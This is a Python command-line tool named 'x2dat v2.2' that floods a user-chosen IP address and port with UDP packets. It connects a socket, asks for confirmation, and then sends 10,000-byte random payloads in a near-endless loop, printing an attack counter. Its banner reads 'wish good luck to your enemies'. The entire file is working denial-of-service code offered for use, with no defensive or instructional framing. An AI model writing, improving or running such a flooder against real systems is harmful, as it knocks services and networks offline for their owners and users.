import socket, random, time
na = 0
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
title = 'x2dat'

print("                     --------------------")
print("                     |   x2dat | v2.2   |")
print("                     --------------------")
time.sleep(1.3)
print("[wish good luck to your enemies]")
time.sleep(0.2)
print("------------------------------------")
ip = input("| Enter Target IP: ")
port = int(input("| Enter Target Port: "))
sleep = float(input("| Sleep: "))
print("------------------------------------")
s.connect((ip, port))
print(f"| CONNECTED! | IP: [{ip}] | PORT: [{port}]")
time.sleep(1.7)
yn = input("| ARE YOU SURE? [Y/N]: ")
print("------------------------------------")
if yn == 'Y':
    print("| STARTING ATTACK...")
    time.sleep(2.3)
    print("| 3")
    time.sleep(0.7)
    print("| 2")
    time.sleep(0.7)
    print("| 1")
    time.sleep(0.7)
    print("------------------------------------")
    for i in range(1, 100 ** 1000):
        s.send(random._urandom(10) * 1000)
        na += 1
        print(f"| ATTACK [{na}]")
        time.sleep(sleep)
elif yn =='N':
    print("| CANCELLING OPPERATION...")
    time.sleep(0.9)
    print("| DONE")
    time.sleep(0.2)
    quit()
